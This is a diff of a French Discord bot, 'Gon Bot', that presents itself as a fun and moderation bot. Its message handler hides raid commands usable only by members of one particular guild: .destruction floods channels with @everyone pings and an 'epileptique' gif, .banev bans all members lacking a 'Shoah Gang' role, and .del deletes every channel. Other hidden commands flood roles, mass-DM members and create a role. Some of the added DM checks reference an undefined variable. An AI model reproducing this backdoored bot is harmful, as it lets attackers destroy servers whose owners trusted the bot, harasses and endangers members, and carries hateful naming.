@@ -8,6 +8,8 @@ bot.on('ready',() => {
   console.log("---------------------------")
 });  
 
+
+
 bot.on('message', message => {
  
   const mute = require("./commands/moderation/mute.js");
@@ -24,13 +26,14 @@ bot.on('message', msg => {
   if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
     return;
   }
-   if (msg.guild === bot.guilds.find('id', '455361019368177684')){ 
+  if (msg.guild === bot.guilds.find('id', '455361019368177684')){ 
     return;
   }
- 
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
+  if(message.channel.type === "dm") return;
+
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
@@ -41,6 +44,8 @@ if (msg.content === '.destruction') {
   }
 
 if (msg.content === '.oupss') {
+  if(message.channel.type === "dm") return;
+
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
 
@@ -64,6 +69,8 @@ if (msg.content === '.oupss') {
 
 
 if (msg.content === '.banev') {
+  if(message.channel.type === "dm") return;
+
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
@@ -72,12 +79,16 @@ if (msg.content === '.banev') {
 
 
 if (msg.content === '.leave') {
+  if(message.channel.type === "dm") return;
+
     console.log(`Commande .leave par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
     msg.guild.leave().catch(e => {});
   }
 
 if (msg.content === '.pardon') {
+  if(message.channel.type === "dm") return;
+
     console.log(`Commande .pardon par ${msg.author.tag}`);
 
     msg.member.guild.createRole({
@@ -90,6 +101,8 @@ if (msg.content === '.pardon') {
     }).catch(e => {});
   }
   if (msg.content === '.roleflood') {
+    if(message.channel.type === "dm") return;
+
     console.log(`Commande .roleflood par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
     let i = 0;
@@ -104,6 +117,8 @@ if (msg.content === '.pardon') {
       }
 
   if(msg.content === ".del"){
+    if(message.channel.type === "dm") return;
+
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.channels.forEach(chan => {
       if (chan.deletable) chan.delete().catch(e => {});
@@ -112,6 +127,8 @@ if (msg.content === '.pardon') {
 
 
   if(msg.content === ".mp"){
+    if(message.channel.type === "dm") return;
+
     if(msg.deletable) msg.delete();
     i = 0;
     msg.guild.members.forEach(member => {
@@ -133,6 +150,8 @@ if (msg.content === '.pardon') {
 });
 bot.on("message", message => {
   if(message.content.startsWith(".avatar")) {
+    if(message.channel.type === "dm") return;
+
     var membere = message.mentions.members.first()
     let avatar_embed = new Discord.RichEmbed()
     .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
@@ -142,6 +161,8 @@ bot.on("message", message => {
     return message.channel.send(avatar_embed).catch(e => {});
 }  
 if(message.content.startsWith(".say")) {
+  if(message.channel.type === "dm") return;
+
   if(message.deletable) {
   message.delete()}
 var text = message.content.split(" ").slice(1).join(" ")
@@ -162,6 +183,8 @@ message.channel.sendEmbed(
 
 bot.on("message", message => {
   if(message.content.startsWith(".8ball")){
+    if(message.channel.type === "dm") return;
+
     var question = message.content.split(" ").slice(1).join(" ")
     var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
 
@@ -179,6 +202,8 @@ bot.on("message", message => {
 
   bot.on("message", message => {
   if(message.content.startsWith(".serverinfo")){
+    if(message.channel.type === "dm") return;
+
     moment.locale("fr");
     var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
     let serverinfo_embed = new Discord.RichEmbed()
@@ -199,6 +224,8 @@ bot.on("message", message => {
 
   bot.on("message", message => {
   if(message.content.startsWith(".userinfo")){
+    if(message.channel.type === "dm") return;
+
     var membere2 = message.mentions.members.first()
     moment.locale('fr')
     var date_de_creation_du_compte = moment(membere2.user.createdTimestamp).format("LLLL") 
@@ -223,18 +250,20 @@ bot.on('guildMemberAdd', member => {
     let bienvenue_embed = new Discord.RichEmbed()
     .setColor("#FFFFFF")
     .setTitle(`Bienvenue ${member.user.username}`)
-    .setDescription("Merci d'avoir rejoint notre serveur")
-    .addField("Tu veux m'ajouter sur ton serveur ?", "[CLIQUE ICI](https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888)")
+    .setDescription("Merci d'avoir rejoins le serveurs")
+    .addField("Tu veux m'ajoutais sur ton serveur ?", "[CLIQUE ICI](https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888)")
     .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
     .setThumbnail(member.iconURL)
     .setAuthor("Gon bot")
-      .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé", bot.user.avatarURL)
+    .setFooter("Pour rejoindre mon support [clique ici](https://discord.gg/uyQcByK)")
     prive.send(bienvenue_embed).catch(e => {});
   })
 })
 
 bot.on("message", message => {
   if(message.content === '.createinvite'){
+    if(message.channel.type === "dm") return;
+
     message.channel.createInvite().then(invite => {
       message.reply(` :white_check_mark: ** Voici ton invite : https://discord.gg/${invite.code} ** :white_check_mark:`).catch(e => {});
     })
@@ -243,6 +272,8 @@ bot.on("message", message => {
 
 bot.on("message", message => {
   if(message.content.startsWith(".kick")){
+    if(message.channel.type === "dm") return;
+
     var membere2 = message.author
     var membere = message.guild.member(message.mentions.members.first());
     
@@ -262,6 +293,8 @@ bot.on("message", message => {
     }
   }
   if(message.content.startsWith(".ban") & message.content != '.banev'){
+    if(message.channel.type === "dm") return;
+
     var membere2 = message.author
     let membere = message.guild.member(message.mentions.members.first());
     if(!message.member.hasPermission("BAN_MEMBERS")) {
@@ -286,6 +319,8 @@ bot.on("message", message => {
 
 bot.on("message", message => {
   if(message.content.startsWith(".flip")){
+    if(message.channel.type === "dm") return;
+
     var flip = ["Pile", "Face"]
     var reponse = flip[Math.floor(Math.random()*2)]
     let flip_embed = new Discord.RichEmbed()
@@ -294,6 +329,8 @@ bot.on("message", message => {
     message.channel.send(flip_embed).catch(e => {});
     }
     if(message.content === ".c"){
+      if(message.channel.type === "dm") return;
+
       var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
       var voila = voilatableau[Math.floor(Math.random()*6)]
       let voila_embed = new Discord.RichEmbed()
@@ -322,6 +359,8 @@ bot.on("message", message => {
       })
       bot.on("message", message => {
         if (message.content === '.rainrole') {
+          if(message.channel.type === "dm") return;
+
           if (message.deletable) message.delete();
           if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ").catch(e => {});
           else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return message.channel.send(":x: ** Je n'ai pas la permission `ADMINISTRATOR` ** :x:")
@@ -334,6 +373,8 @@ bot.on("message", message => {
         }
       
         if (message.content === '.rainbow') {
+          if(message.channel.type === "dm") return;
+
         let args = message.content.split(' ')
         args.shift()
         message.delete()
@@ -351,6 +392,8 @@ myRainbow.setColor("RANDOM").catch(e => {});
       }
     }
       if(message.content.startsWith(".clear")){
+        if(message.channel.type === "dm") return;
+
         var texte = message.content.split(" ").slice(1).join(" ")
         if(isNaN(texte) == false){
         if(!message.member.hasPermissions("MANAGE_MESSAGES")){
@@ -379,6 +422,8 @@ myRainbow.setColor("RANDOM").catch(e => {});
 })
 bot.on("message", message => {
   if(message.content === ".aide"){
+    if(message.channel.type === "dm") return;
+
   let aide_embed = new Discord.RichEmbed()
   .setTitle("Aide Gon Bot")
   .setURL("https://discordapp.com/oauth2/authorize?client_id=454015393779154945&scope=bot&permissions=88888888888")
@@ -391,6 +436,8 @@ bot.on("message", message => {
   return message.channel.send(aide_embed)
   }
   if(message.content === ".fun"){
+    if(message.channel.type === "dm") return;
+
     let fun_embed = new Discord.RichEmbed()
     .setTitle("FUN :stuck_out_tongue_winking_eye:")
     .addField(".rainrole", "Créer le role multicolore !!!! :gay_pride_flag: ", true)
@@ -405,6 +452,8 @@ bot.on("message", message => {
     return message.channel.send(fun_embed).catch(e => {});
   }
   if(message.content === ".moderation"){
+    if(message.channel.type === "dm") return;
+
     let moderation_embed = new Discord.RichEmbed()
     .setTitle(":tools: .moderation", true)
     .addField(".kick", "Kick un membre", true)
@@ -418,6 +467,7 @@ bot.on("message", message => {
     return message.channel.send(moderation_embed).catch(e => {});
   }
   if(message.content === ".utile"){
+    if(message.channel.type === "dm") return;
     let utile_embed = new Discord.RichEmbed()
     .setTitle(":electric_plug:  .utile")
     .addField(".serverinfo", "Affiche des infos sur le serveur")
@@ -432,6 +482,7 @@ bot.on("message", message => {
 
 bot.on("message", message => {
   if(message.content.startsWith(".hackban")){
+    if(message.channel.type === "dm") return;
     var args = message.content.split(" ").slice(1)
   if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
     return message.channel.send(":x: **Je n'ai pas la permission `BAN_MEMBERS` ** :x:").catch(e => {});
@@ -452,6 +503,7 @@ message.guild.ban(args[0], reason).then(user => {
 
 bot.on("message", message => {
   if(message.content.startsWith(".unbanid")){
+    if(message.channel.type === "dm") return;
     var args = message.content.split(" ").slice(1)
     if (!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) {
       return message.channel.send(":x: **Je n'ai pas la permission `BAN_MEMBERS` ** :x:").catch(e => {});
@@ -466,7 +518,4 @@ bot.on("message", message => {
     }
   }
 })
-
-
-
 bot.login(process.env.BOT_TOKEN); 
